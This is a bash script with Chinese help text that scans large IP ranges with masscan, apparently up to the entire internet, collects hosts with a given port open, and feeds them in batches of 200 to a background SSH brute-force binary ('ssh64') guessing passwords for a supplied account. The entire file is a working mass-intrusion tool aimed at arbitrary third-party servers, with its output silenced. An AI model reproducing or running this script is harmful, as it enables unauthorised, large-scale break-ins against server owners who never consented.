#!/bin/bash
if [ $# -ne 5 ];
then
    echo "脚本默认扫描工具为masscan没有自行安装或者自行更换其他扫描工具"
    echo "运行参数应为 ./scan IP范围  端口 扫描线程 爆破线程 爆破账号"
    echo "IP范围支持1.0.0.0-1.255.255.255或 1.0.0.0/8这种"
    echo "扫描线程取1-100万左右,G口肯定是100万跑,线程越低结果越准,100万宽带充足基本可以1 2个小时扫描全球"
    echo "爆破线程,单一程序爆破虽然方便了,但是准确率太低了,这个线程1=传统工具100,具体自行测试,CPU总占用不满就好"
    exit
fi
echo  'Scan   ing ...'
masscan $1 -p $2 --rate $3 --excludefile pingbi.txt -oL a.txt -iL duanzi.txt
echo  '' > ip.txt
cat a.txt | grep -B0 open | grep -oP '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | sort -u > ip.txt
rm -f a.txt
echo  'Brute force attack ing....' 
./check -p $2
rm -f ip.txt 
mv iptmp.txt ip.txt
chmod +x ip.txt
thread=$4
while true
do
     job_num=$(ps aux | grep "ssh64" | grep -v grep | wc -l)
              if [[ $job_num -le $thread ]]; then
                   ip_num=$(sed -n '$=' ip.txt)
                    if [[ $ip_num -le 200 ]]; then
                    head -200 ip.txt > ips.txt
                    nohup ./ssh64 -p $2 -u $5 > /dev/null 2>&1 &
                    break
                    else
                    head -200 ip.txt > ips.txt
                    sed -i '1,200d' ip.txt
                    nohup ./ssh64 -p $2 -u $5 > /dev/null 2>&1 &
                    fi
              else
              sleep 10
              fi
done